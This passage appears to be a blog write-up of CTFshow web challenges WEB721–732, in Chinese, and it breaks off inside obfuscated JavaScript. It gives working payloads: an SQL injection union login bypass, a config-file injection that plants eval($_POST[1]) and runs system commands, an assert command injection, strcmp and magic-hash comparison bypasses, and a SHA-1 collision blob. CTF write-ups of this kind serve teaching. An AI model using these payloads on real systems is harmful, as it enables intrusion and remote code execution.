class="hljs-meta">%BF</span><span class="hljs-meta">%3F</span><span class="hljs-meta">%98</span><span class="hljs-meta">%CD</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%04F</span><span class="hljs-meta">%29</span><span class="hljs-meta">%A1</span>&amp;password=<span class="hljs-meta">%25PDF-1</span>.<span class="hljs-number">3</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%25</span><span class="hljs-meta">%E2</span><span class="hljs-meta">%E3</span><span class="hljs-meta">%CF</span><span class="hljs-meta">%D3</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0A1</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20obj</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%3C</span><span class="hljs-meta">%3C</span>/Width<span class="hljs-meta">%202</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Height<span class="hljs-meta">%203</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Type<span class="hljs-meta">%204</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Subtype<span class="hljs-meta">%205</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Filter<span class="hljs-meta">%206</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/ColorSpace<span class="hljs-meta">%207</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Length<span class="hljs-meta">%208</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/BitsPerComponent<span class="hljs-meta">%208</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%0Astream</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%D8</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%00</span><span class="hljs-meta">%24SHA-1</span><span class="hljs-meta">%20is</span><span class="hljs-meta">%20dead</span><span class="hljs-meta">%21</span><span class="hljs-meta">%21</span><span class="hljs-meta">%21</span><span class="hljs-meta">%21</span><span class="hljs-meta">%21</span><span class="hljs-meta">%85</span>/<span class="hljs-meta">%EC</span><span class="hljs-meta">%09</span><span class="hljs-meta">%239u</span><span class="hljs-meta">%9C9</span><span class="hljs-meta">%B1</span><span class="hljs-meta">%A1</span><span class="hljs-meta">%C6</span><span class="hljs-meta">%3CL</span><span class="hljs-meta">%97</span><span class="hljs-meta">%E1</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%01sF</span><span class="hljs-meta">%DC</span><span class="hljs-meta">%91f</span><span class="hljs-meta">%B6</span><span class="hljs-meta">%7E</span><span class="hljs-meta">%11</span><span class="hljs-meta">%8F</span><span class="hljs-meta">%02</span><span class="hljs-meta">%9A</span><span class="hljs-meta">%B6</span><span class="hljs-meta">%21</span><span class="hljs-meta">%B2V</span><span class="hljs-meta">%0F</span><span class="hljs-meta">%F9</span><span class="hljs-meta">%CAg</span><span class="hljs-meta">%CC</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%C7</span><span class="hljs-meta">%F8</span><span class="hljs-meta">%5B</span><span class="hljs-meta">%A8Ly</span><span class="hljs-meta">%03</span><span class="hljs-meta">%0C</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%E2</span><span class="hljs-meta">%18</span><span class="hljs-meta">%F8m</span><span class="hljs-meta">%B3</span><span class="hljs-meta">%A9</span><span class="hljs-meta">%09</span><span class="hljs-meta">%01</span><span class="hljs-meta">%D5</span><span class="hljs-meta">%DFE</span><span class="hljs-meta">%C1O</span><span class="hljs-meta">%26</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%DF</span><span class="hljs-meta">%B3</span><span class="hljs-meta">%DC8</span><span class="hljs-meta">%E9j</span><span class="hljs-meta">%C2</span>/<span class="hljs-meta">%E7</span><span class="hljs-meta">%BDr</span><span class="hljs-meta">%8F</span><span class="hljs-meta">%0EE</span><span class="hljs-meta">%BC</span><span class="hljs-meta">%E0F</span><span class="hljs-meta">%D2</span><span class="hljs-meta">%3CW</span><span class="hljs-meta">%0F</span><span class="hljs-meta">%EB</span><span class="hljs-meta">%14</span><span class="hljs-meta">%13</span><span class="hljs-meta">%98</span><span class="hljs-meta">%BBU</span>.<span class="hljs-meta">%F5</span><span class="hljs-meta">%A0</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%E31</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%A4</span><span class="hljs-meta">%807</span><span class="hljs-meta">%B8</span><span class="hljs-meta">%B5</span><span class="hljs-meta">%D7</span><span class="hljs-meta">%1F</span><span class="hljs-meta">%0E3</span>.<span class="hljs-meta">%DF</span><span class="hljs-meta">%93</span><span class="hljs-meta">%AC5</span><span class="hljs-meta">%00</span><span class="hljs-meta">%EBM</span><span class="hljs-meta">%DC</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%EC</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%A8dy</span><span class="hljs-meta">%0Cx</span><span class="hljs-meta">%2Cv</span><span class="hljs-meta">%21V</span><span class="hljs-meta">%60</span><span class="hljs-meta">%DD0</span><span class="hljs-meta">%97</span><span class="hljs-meta">%91</span><span class="hljs-meta">%D0k</span><span class="hljs-meta">%D0</span><span class="hljs-meta">%AF</span><span class="hljs-meta">%3F</span><span class="hljs-meta">%98</span><span class="hljs-meta">%CD</span><span class="hljs-meta">%A4</span><span class="hljs-meta">%BCF</span><span class="hljs-meta">%29</span><span class="hljs-meta">%B1</span><br></code></pre></td></tr></table></figure>

<h1 id="WEB721"><a href="#WEB721" class="headerlink" title="WEB721"></a>WEB721</h1><p>F12看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;!-- CTFSHOW hint:<br>      <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$row</span>[pass]) &amp;&amp; (!<span class="hljs-title function_ invoke__">strcasecmp</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>), <span class="hljs-variable">$row</span>[pass]))) &#123;<br>              <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Logged in! &quot;</span>.<span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot; &lt;/p&gt;&quot;</span>;<br>        &#125;<br>--&gt;<br></code></pre></td></tr></table></figure>

<p>从数据库中提取出pass 然后逻辑与 与右边的(!strcasecmp($pass, $row[pass])) 两条语句都为真才会打印出flag</p>
<p>构造一个联合查询:这样第一条语句查询<code>a</code>这个用户查不到,然后第二个根据特性会返回这个结果到password字段下</p>
<p>payload：</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><code class="hljs gauss">username:a&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-built_in">md5</span>(<span class="hljs-number">1</span>)<span class="hljs-meta">#</span><br>password:<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<h1 id="WEB726"><a href="#WEB726" class="headerlink" title="WEB726"></a>WEB726</h1><p>F12看源码<br>跟WEB692一样，是Php写入配置文件的经典漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;!-- CTFSHOW hint:<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|\$db=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="hljs-string">&quot;\$db=&#x27;<span class="hljs-subst">$username</span>&#x27;;&quot;</span>, <span class="hljs-variable">$file</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>, <span class="hljs-variable">$file</span>);<br>--&gt;<br></code></pre></td></tr></table></figure>

<p>但是用692的方法做不出来，这里用其他方法（利用 preg_replace() 函数的第二个参数的问题）</p>
<p>我们首先传入<code>username=;eval($_POST[1]);</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web726-1.jpg"></p>
<p>这时，<code>config.php</code>文件中的内容为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$option</span>=<span class="hljs-string">&#x27;;phpinfo();&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>因为在<code>preg_replace</code>函数中<code>\\0</code>和<code>$0</code>代表完整的模式匹配文本</p>
<p>所以当我们传入<code>username=$0</code>后<br><code>config.php</code>的内容就变成了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$db</span>=<span class="hljs-string">&#x27;$db=&#x27;</span>;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-string">&#x27;;&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p>两个单引号刚好闭合上，成功构造出<code>eval</code>函数</p>
<p>访问config.php，传入<code>1=system(&#39;tac flag.php&#39;);</code>,拿到flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web726-2.jpg"></p>
<h1 id="WEB728"><a href="#WEB728" class="headerlink" title="WEB728"></a>WEB728</h1><p>F12看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;!-- CTFSHOW hint:<br>        <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;templates/&quot;</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">&quot;.php&quot;</span>;            <span class="hljs-comment">//将page变量拼接成一个templates下的php文件，设置为变量file</span><br>        <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hack!&quot;</span>);            <span class="hljs-comment">//判断file中是否有&quot; .. &quot;，如果有则直接退出</span><br>--&gt;<br></code></pre></td></tr></table></figure>
<p>利用<code>&#39;)</code>闭合，并使用<code>//</code>注释后面的内容，以执行我们的命令</p>
<p>payload：<br><code>1&#39;) or system(&#39;tac ./templates/flag.php&#39;);//</code></p>
<h1 id="WEB729"><a href="#WEB729" class="headerlink" title="WEB729"></a>WEB729</h1><p>F12看到代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;!-- CTFSHOW hint:<br>              <span class="hljs-variable">$flag_input</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>];<br>              <span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strcmp</span>(flag_input,<span class="hljs-variable">$flag</span>)))<br>              &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;flag不正确&quot;</span>);<br>              &#125;<br>              <span class="hljs-variable">$_p</span> = <span class="hljs-number">6543</span>;<br>              <span class="hljs-variable">$_l</span> = <span class="hljs-number">21</span>;<br><br>              <span class="hljs-variable">$l</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;secret&#x27;</span>]);<br>              <span class="hljs-variable">$_i</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;secret&#x27;</span>]);<br>              <span class="hljs-keyword">if</span>(<span class="hljs-variable">$l</span> !== <span class="hljs-variable">$_l</span> || <span class="hljs-variable">$_i</span> !== <span class="hljs-variable">$_p</span>)<br>              &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;系统异常&quot;</span>);<br>              &#125;<br><br>              <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt; !--<span class="hljs-subst">$flag</span>-- &gt;&quot;</span>;<br>--&gt;<br></code></pre></td></tr></table></figure>
<p>我们需要过两个if的判断</p>
<p>第一个if：<br><code>strcmp()</code>函数的作用是比较两个字符串，相同则为0。因为<code>strcmp</code>函数无法比较数组，会返回0，将flag输入为数组即可绕过。</p>
<p>第二个if：<br>要满足两个条件，长度为21，整数值为6534</p>
<p>综上所述，构造的payload为</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /?secret=<span class="hljs-number">6543</span>aaaaaaaaaaaaaaaaa<br><span class="hljs-attribute">flag</span>[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<h1 id="WEB731"><a href="#WEB731" class="headerlink" title="WEB731"></a>WEB731</h1><p>F12看到hint<br>一个sha1的弱比较<br>传入一个0e开头的值即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;!-- CTFSHOW hint:<br>              <span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash&#x27;</span>]);<br>              <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-number">10932435112</span>);<br>              <span class="hljs-keyword">if</span>(<span class="hljs-variable">$hash</span> == <span class="hljs-variable">$target</span>) &#123;<br>                  <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                  <span class="hljs-keyword">print</span> <span class="hljs-variable">$flag</span>;<br>              &#125;<br>--&gt;<br></code></pre></td></tr></table></figure>
<p>参考值</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><code class="hljs dns">aaroZmOk:<span class="hljs-number">0</span>e66507019969427134894567494<span class="hljs-number">305185566735</span><br>aaK1STfY:<span class="hljs-number">0</span>e766585266557562076882711596<span class="hljs-number">24026011393</span><br>aaO8zKZF:<span class="hljs-number">0</span>e89257456677279068558073954<span class="hljs-number">252716165668</span><br>aa3OFF9m:<span class="hljs-number">0</span>e369777862785179849592603940<span class="hljs-number">24281014729</span><br>w9KASOk6Ikap:<span class="hljs-number">0</span>e946854899415574049375681817<span class="hljs-number">16894429726</span><br>CZbnUtm/wD+<span class="hljs-number">0</span>:<span class="hljs-number">00</span>e6513589156647795423839906<span class="hljs-number">410117726741</span><br>RSnake33ncxYMsiIgw:<span class="hljs-number">00</span>e04465709165339343536297988<span class="hljs-number">24448898569</span><br>hashcatRhtkuysFOYYh:<span class="hljs-number">0</span>ec6007027368764166354656983<span class="hljs-number">137779429045</span><br>hashcat7YfJg9x6AqNA:<span class="hljs-number">0</span>e50220802416020462770479580<span class="hljs-number">634172053582</span><br>hashcatJbYtCyUf7I3K:<span class="hljs-number">00</span>e9121985231400931761319208<span class="hljs-number">500866143806</span><br>hashcatZJCFhv5hhkxM:<span class="hljs-number">0</span>e226226307086042822515776180<span class="hljs-number">83953362629</span><br>hashcat7gqQ5KzDJRDe:<span class="hljs-number">0</span>e89084512868781863087376038<span class="hljs-number">568650856166</span><br>hashcatU4BRJMv0wZQ9:<span class="hljs-number">0</span>e266482064222621555984296124<span class="hljs-number">13699840868</span><br>hashcat6gP5u3LfjkB4:<span class="hljs-number">00</span>e4745251895202147342658062<span class="hljs-number">640046218324</span><br>hashcatGqnE8xnyDXTf:<span class="hljs-number">0</span>e15969028436788874806413050<span class="hljs-number">149455726924</span><br>hashcatirBCZWadC4V6:<span class="hljs-number">0</span>e3164985181018719329930928<span class="hljs-number">1808938075168</span><br>hashcat0vScS1X5pWWD:<span class="hljs-number">00</span>e8504108085943725027274200<span class="hljs-number">432213595492</span><br>hashcat46AOYaAyyXRm:<span class="hljs-number">0</span>e12074483623118174676713113<span class="hljs-number">381129899097</span><br>hashcatHArOfcXelAhD:<span class="hljs-number">00</span>e4559098389903496918609646<span class="hljs-number">734123833089</span><br>hashcatQH5Q477JNSPy:<span class="hljs-number">0</span>e55688066453591945830139349<span class="hljs-number">969019185986</span><br>hashcatw1ZBfRtYm5oM:<span class="hljs-number">0</span>e050335622759909145786106186<span class="hljs-number">94299895931</span><br>hashcatoSz6YKuiFR3Y:<span class="hljs-number">0</span>ee0160094252962728385313526<span class="hljs-number">058227602671</span><br>hashcatypQJbFRa1dZt:<span class="hljs-number">0</span>e551050306936667902850440720<span class="hljs-number">61907048558</span><br>hashcatFN2n52JGTFx5:<span class="hljs-number">0</span>e448836342008124394987495855<span class="hljs-number">01922916636</span><br><span class="hljs-number">0</span>e000000000000000000000816146<span class="hljs-number">17300000000</span>:<span class="hljs-number">0</span>e65307525940999632287492285<span class="hljs-number">468259219070</span><br><span class="hljs-number">0</span>e0000000000000000000072190<span class="hljs-number">2017120000000</span>:<span class="hljs-number">0</span>e94981159498252295418182453<span class="hljs-number">841140483274</span><br><span class="hljs-number">0</span>e010110011010110100011011<span class="hljs-number">10101100101000</span>:<span class="hljs-number">0</span>e48906523151976751117677463<span class="hljs-number">787111106598</span><br><span class="hljs-number">0</span>e11001000001010011000100000<span class="hljs-number">010001101000</span>:<span class="hljs-number">0</span>e634071849609304190270627777<span class="hljs-number">05081379452</span><br><span class="hljs-number">0</span>e010000011000000010100110<span class="hljs-number">11001000000100</span>:<span class="hljs-number">0</span>e55962072388397083814346733<span class="hljs-number">718698213796</span><br><span class="hljs-number">0</span>e1001111000010110100001110<span class="hljs-number">1011010100100</span>:<span class="hljs-number">0</span>e31188585417285828785355336<span class="hljs-number">774237712792</span><br><span class="hljs-number">0</span>e010101110001111110101010<span class="hljs-number">11010111010100</span>:<span class="hljs-number">0</span>e4590634456961665942880889<span class="hljs-number">2091261969181</span><br><span class="hljs-number">0</span>e001000011100000011110100<span class="hljs-number">00010011101100</span>:<span class="hljs-number">0</span>e14860258669052332549568607<span class="hljs-number">710438132953</span><br><span class="hljs-number">0</span>e1111000011101000100110111<span class="hljs-number">1111110010010</span>:<span class="hljs-number">0</span>e121742584363857585528744269<span class="hljs-number">41686538483</span><br><span class="hljs-number">0</span>e1011111001110010110001010<span class="hljs-number">1111010000110</span>:<span class="hljs-number">0</span>e997743982825933760434620385<span class="hljs-number">72281385389</span><br><span class="hljs-number">0</span>e110011111101111100101110<span class="hljs-number">10000011110110</span>:<span class="hljs-number">0</span>e631852213010346249403454710<span class="hljs-number">74357888797</span><br><span class="hljs-number">0</span>e000010100101011001001010<span class="hljs-number">11101110001110</span>:<span class="hljs-number">0</span>e90943988772171749054413593<span class="hljs-number">888105986782</span><br><span class="hljs-number">0</span>e01011101110010111011110010<span class="hljs-number">010010101110</span>:<span class="hljs-number">0</span>e016088001926598035767713466<span class="hljs-number">07441737826</span><br><span class="hljs-number">0</span>e10111110101111001000000<span class="hljs-number">100011101101110</span>:<span class="hljs-number">0</span>e4909454145847949526303429<span class="hljs-number">4421025186938</span><br><span class="hljs-number">0</span>e111001111011100110101110<span class="hljs-number">01010101111110</span>:<span class="hljs-number">0</span>e557707061499487600862007135<span class="hljs-number">05841887543</span><br><span class="hljs-number">0</span>e1111100101010110011001100<span class="hljs-number">1010001110001</span>:<span class="hljs-number">0</span>e91120687121163809515824135<span class="hljs-number">435029958137</span><br><span class="hljs-number">0</span>e010001111011111100100100100<span class="hljs-number">00001001001</span>:<span class="hljs-number">0</span>e780717973285463693018254208<span class="hljs-number">48872451849</span><br><span class="hljs-number">0</span>e0010011010001010011000110<span class="hljs-number">1110110110101</span>:<span class="hljs-number">0</span>e060773804082606146592199205<span class="hljs-number">61082767632</span><br><span class="hljs-number">0</span>e11111100001011000011110100<span class="hljs-number">100010111101</span>:<span class="hljs-number">0</span>e121491203544153352207583994<span class="hljs-number">92713921588</span><br><span class="hljs-number">0</span>e00111100110101101001000<span class="hljs-number">101011011111101</span>:<span class="hljs-number">0</span>e386611265697905555984319050<span class="hljs-number">65403870516</span><br><span class="hljs-number">0</span>e10100011100101000001110010<span class="hljs-number">100110100011</span>:<span class="hljs-number">0</span>e557450781546402125115962590<span class="hljs-number">55910278070</span><br><span class="hljs-number">0</span>e10011110011111001001100100<span class="hljs-number">000111011011</span>:<span class="hljs-number">0</span>e203197311231014779132957<span class="hljs-number">20812414482217</span><br>&amp;O&amp;GKtn&amp;<span class="hljs-number">54</span>xQ:<span class="hljs-number">00</span>e8144605926111857621787045<span class="hljs-number">161777776795</span><br>Sk~HOM&amp;QzJXl:<span class="hljs-number">00</span>e8943083323373991014599597<span class="hljs-number">566984182387</span><br><span class="hljs-number">1023456852390915</span>:<span class="hljs-number">0</span>e263793747703520246661489688<span class="hljs-number">68586665768</span><br>lowercasegzmgqmx:<span class="hljs-number">0</span>e462572807872319436183060736<span class="hljs-number">89855362607</span><br>lowercasifdvqkfr:<span class="hljs-number">0</span>e11372668415308535558155136<span class="hljs-number">274413213182</span><br>lowercasebchqcwctky:<span class="hljs-number">0</span>e632700192129617919000556987<span class="hljs-number">86302314274</span><br>lowercaseabcsobpkrt:<span class="hljs-number">0</span>e54706107047262165256262457<span class="hljs-number">226759421225</span><br>UPPERCASFFLIIQWR:<span class="hljs-number">00</span>e0209539108131630074694125<span class="hljs-number">235505223102</span><br>MixedCaseERWqTVQ:<span class="hljs-number">0</span>e26765837881628507475765845<span class="hljs-number">815158037783</span><br>MixCaseDigJiRR9d:<span class="hljs-number">00</span>e69706953514223243490393817<span class="hljs-number">94949865825</span><br>Punc!<span class="hljs-number">0</span>&quot;*!&quot;#$<span class="hljs-number">8</span>!zv:<span class="hljs-number">0</span>e77726009946581613829608157<span class="hljs-number">794165640009</span><br>Punctu!U&quot;F5ru:<span class="hljs-number">0</span>e100057698412719994061415552<span class="hljs-number">58742283712</span><br>Punctuatiow$&#x27;l9X:<span class="hljs-number">0</span>e16039695246683143323677708<span class="hljs-number">220808911326</span><br>Punctuati0t..jsI:<span class="hljs-number">0</span>e772379489690141187949100916<span class="hljs-number">59528041921</span><br></code></pre></td></tr></table></figure>

<h1 id="WEB732"><a href="#WEB732" class="headerlink" title="WEB732"></a>WEB732</h1><p>F12得到hint:password.js</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;!-- CTFSHOW hint:<br>              password.js<br>--&gt;<br></code></pre></td></tr></table></figure>

<p>访问后发现是被混淆过的js代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> _0x575c=[<span class="hljs-string">&#x27;\x32\x2d\x34&#x27;</span>,<span class="hljs-string">&#x27;\x73\x75\x62\x73\x74\x72\x69\x6e\x67&#x27;</span>,<span class="hljs-string">&#x27;\x34\x2d\x37&#x27;</span>,<span class="hljs-string">&#x27;\x67\x65\x74\x49\x74\x65\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x64\x65\x6c\x65\x74\x65\x49\x74\x65\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x31\x32\x2d\x31\x34&#x27;</span>,<span class="hljs-string">&#x27;\x30\x2d\x32&#x27;</span>,<span class="hljs-string">&#x27;\x73\x65\x74\x49\x74\x65\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x39\x2d\x31\x32&#x27;</span>,<span class="hljs-string">&#x27;\x5e\x37\x4d&#x27;</span>,<span class="hljs-string">&#x27;\x75\x70\x64\x61\x74\x65\x49\x74\x65\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x62\x62\x3d&#x27;</span>,<span class="hljs-string">&#x27;\x37\x2d\x39&#x27;</span>,<span class="hljs-string">&#x27;\x31\x34\x2d\x31\x36&#x27;</span>,<span class="hljs-string">&#x27;\x6c\x6f\x63\x61\x6c\x53\x74\x6f\x72\x61\x67\x65&#x27;</span>,];(<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x4f0aae,_0x575cf8</span>)&#123;<span class="hljs-keyword">var</span> _0x51eea2=<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x180eeb</span>)&#123;<span class="hljs-keyword">while</span>(--_0x180eeb)&#123;_0x4f0aae[<span class="hljs-string">&#x27;push&#x27;</span>](_0x4f0aae[<span class="hljs-string">&#x27;shift&#x27;</span>]());&#125;&#125;;<span class="hljs-title function_">_0x51eea2</span>(++_0x575cf8);&#125;(_0x575c,<span class="hljs-number">0x78</span>));<span class="hljs-keyword">var</span> _0x51ee=<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x4f0aae,_0x575cf8</span>)&#123;_0x4f0aae=_0x4f0aae-<span class="hljs-number">0x0</span>;<span class="hljs-keyword">var</span> _0x51eea2=_0x575c[_0x4f0aae];<span class="hljs-keyword">return</span> _0x51eea2;&#125;;<span class="hljs-keyword">function</span> <span class="hljs-title function_">CheckPassword</span>(<span class="hljs-params">_0x47df21</span>)&#123;<span class="hljs-keyword">var</span> _0x4bbdc3=[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xe&#x27;</span>),<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x3&#x27;</span>),<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x7&#x27;</span>),<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x4&#x27;</span>),<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xa&#x27;</span>)];<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-string">&#x27;9-12&#x27;</span>,<span class="hljs-string">&#x27;BE*&#x27;</span>);<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x2&#x27;</span>),<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xb&#x27;</span>));<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x6&#x27;</span>),<span class="hljs-string">&#x27;5W&#x27;</span>);<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x9&#x27;</span>));<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x5&#x27;</span>),<span class="hljs-string">&#x27;pg&#x27;</span>);<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-string">&#x27;7-9&#x27;</span>,<span class="hljs-string">&#x27;+n&#x27;</span>);<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xd&#x27;</span>),<span class="hljs-string">&#x27;4t&#x27;</span>);<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x0&#x27;</span>),<span class="hljs-string">&#x27;$F&#x27;</span>);<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x8&#x27;</span>))===_0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x9</span>,<span class="hljs-number">0xc</span>))&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x2&#x27;</span>))===_0x47df21[<span class="hljs-string">&#x27;substring&#x27;</span>](<span class="hljs-number">0x4</span>,<span class="hljs-number">0x7</span>))&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x6&#x27;</span>))===_0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x0</span>,<span class="hljs-number">0x2</span>))&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-string">&#x27;16&#x27;</span>)===_0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x10</span>))&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x5&#x27;</span>))===_0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0xc</span>,<span class="hljs-number">0xe</span>))&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable 